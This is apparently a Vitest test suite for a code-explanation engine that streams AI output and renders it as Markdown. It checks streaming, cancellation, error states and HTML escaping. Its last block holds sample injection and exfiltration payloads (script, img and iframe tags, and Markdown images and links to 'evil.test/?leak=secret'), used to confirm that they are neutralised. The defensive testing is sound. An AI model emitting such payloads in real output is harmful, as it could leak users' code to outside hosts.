import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { ExplanationEngine } from "../../src/engine/explanationEngine";
import { FakeHarness } from "../../src/harness/fakeHarness";
import {
  HarnessError,
  type HarnessAdapter,
} from "../../src/harness/harnessAdapter";

const aSelection = {
  selection: "const a = 1;",
  fileContents: "const a = 1;\nconst b = 2;\n",
  settings: {},
};

describe("Explanation engine", () => {
  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  it("shows a hint before anything has been explained", () => {
    const engine = new ExplanationEngine(new FakeHarness(), () => {});

    expect(engine.state).toMatchObject({
      kind: "hint",
      message: expect.stringMatching(/select .*code/i),
    });
  });

  it("shows that an explanation is running before any text arrives", () => {
    const harness = new FakeHarness({ steps: ["Hello"], stepDelayMs: 10 });
    const engine = new ExplanationEngine(harness, () => {});

    void engine.explain(aSelection);

    expect(engine.state).toMatchObject({ kind: "explaining", html: "" });
  });

  it("streams an explanation in incrementally and renders it as Markdown", async () => {
    const harness = new FakeHarness({
      steps: ["# Title\n\n", "Some **bold", "** text"],
      stepDelayMs: 10,
    });
    const engine = new ExplanationEngine(harness, () => {});

    void engine.explain(aSelection);

    await vi.advanceTimersByTimeAsync(10);
    expect(engine.state).toMatchObject({
      kind: "explaining",
      html: "<h1>Title</h1>\n",
    });

    await vi.advanceTimersByTimeAsync(10);
    expect(engine.state).toMatchObject({
      kind: "explaining",
      html: "<h1>Title</h1>\n<p>Some **bold</p>\n",
    });

    await vi.advanceTimersByTimeAsync(10);
    expect(engine.state).toEqual({
      kind: "explained",
      html: "<h1>Title</h1>\n<p>Some <strong>bold</strong> text</p>\n",
    });
  });

  it("sends the selection, the file contents and the chosen model to the harness", async () => {
    const harness = new FakeHarness({ steps: [] });
    const engine = new ExplanationEngine(harness, () => {});

    await engine.explain({
      selection: "const b = 2;",
      fileContents: "const a = 1;\nconst b = 2;\n",
      settings: { model: "a-model" },
    });

    expect(harness.requests).toEqual([
      {
        selection: "const b = 2;",
        fileContents: "const a = 1;\nconst b = 2;\n",
        model: "a-model",
      },
    ]);
  });

  it("does nothing when no code is selected", async () => {
    const harness = new FakeHarness({ steps: ["An answer"] });
    const engine = new ExplanationEngine(harness, () => {});
    const hint = engine.state;

    await engine.explain({ ...aSelection, selection: "" });

    expect(harness.requests).toEqual([]);
    expect(engine.state).toEqual(hint);
  });

  it("cancels a running explanation when another one starts", async () => {
    const harness = new FakeHarness({
      steps: ["First ", "chunk"],
      stepDelayMs: 10,
    });
    const engine = new ExplanationEngine(harness, () => {});

    const first = engine.explain(aSelection);
    await vi.advanceTimersByTimeAsync(10);
    const second = engine.explain(aSelection);
    await vi.advanceTimersByTimeAsync(20);
    await Promise.all([first, second]);

    expect(harness.cancelledRuns).toBe(1);
    expect(engine.state).toEqual({
      kind: "explained",
      html: "<p>First chunk</p>\n",
    });
  });

  it("ignores text from a cancelled run that arrives late", async () => {
    let releaseStaleText = () => {};
    const staleTextReady = new Promise<void>((resolve) => {
      releaseStaleText = resolve;
    });
    const harness: HarnessAdapter = {
      detect: async () => true,
      async *stream(request) {
        if (request.selection === "first") {
          await staleTextReady;
          yield "Stale text";
          return;
        }
        yield "Fresh text";
      },
    };
    const engine = new ExplanationEngine(harness, () => {});

    const first = engine.explain({ ...aSelection, selection: "first" });
    await engine.explain({ ...aSelection, selection: "second" });
    releaseStaleText();
    await first;

    expect(engine.state).toEqual({
      kind: "explained",
      html: "<p>Fresh text</p>\n",
    });
  });

  it("shows a typed harness error instead of a partial explanation", async () => {
    const harness = new FakeHarness({
      steps: [
        "Partial text",
        new HarnessError("not-logged-in", "Log in to your harness."),
      ],
      stepDelayMs: 10,
    });
    const engine = new ExplanationEngine(harness, () => {});

    void engine.explain(aSelection);
    await vi.advanceTimersByTimeAsync(20);

    expect(engine.state).toEqual({
      kind: "failed",
      error: "not-logged-in",
      message: "Log in to your harness.",
    });
  });

  it("reports an unexpected harness failure rather than staying on running", async () => {
    const harness: HarnessAdapter = {
      detect: async () => true,
      async *stream() {
        throw new TypeError("a bug in the adapter");
      },
    };
    const engine = new ExplanationEngine(harness, () => {});

    await engine.explain(aSelection);

    expect(engine.state).toMatchObject({ kind: "failed", error: "failed" });
  });

  describe("given hostile text in an explanation", () => {
    async function htmlFor(explanation: string): Promise<string> {
      const harness = new FakeHarness({
        steps: [explanation],
        stepDelayMs: 10,
      });
      const engine = new ExplanationEngine(harness, () => {});

      const run = engine.explain(aSelection);
      await vi.advanceTimersByTimeAsync(10);
      await run;

      if (engine.state.kind !== "explained") {
        throw new Error(`Expected an explanation, got ${engine.state.kind}`);
      }
      return engine.state.html;
    }

    it("escapes raw HTML", async () => {
      expect(
        await htmlFor('<script>alert(1)</script> <img src="https://evil.test/a.png">'),
      ).toBe(
        "<p>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=&quot;https://evil.test/a.png&quot;&gt;</p>\n",
      );
    });

    it("escapes a raw HTML block", async () => {
      expect(await htmlFor('<iframe src="https://evil.test"></iframe>')).toBe(
        "<p>&lt;iframe src=&quot;https://evil.test&quot;&gt;&lt;/iframe&gt;</p>\n",
      );
    });

    it("never creates an image, so nothing is fetched from a URL", async () => {
      expect(await htmlFor("![code](https://evil.test/?leak=secret)")).toBe(
        "<p>![code](https://evil.test/?leak=secret)</p>\n",
      );
    });

    it("never creates a reference-style image", async () => {
      const html = await htmlFor(
        "![code][leak]\n\n[leak]: https://evil.test/?leak=secret\n",
      );

      expect(html).not.toMatch(/<(img|a)\b/);
    });

    it("never creates a link, so one click can't send code to a URL", async () => {
      expect(await htmlFor("[click](https://evil.test/?leak=secret)")).toBe(
        "<p>[click](https://evil.test/?leak=secret)</p>\n",
      );
    });

    it("never creates a link from an autolink", async () => {
      expect(await htmlFor("<https://evil.test/?leak=secret>")).toBe(
        "<p>&lt;https://evil.test/?leak=secret&gt;</p>\n",
      );
    });
  });
});
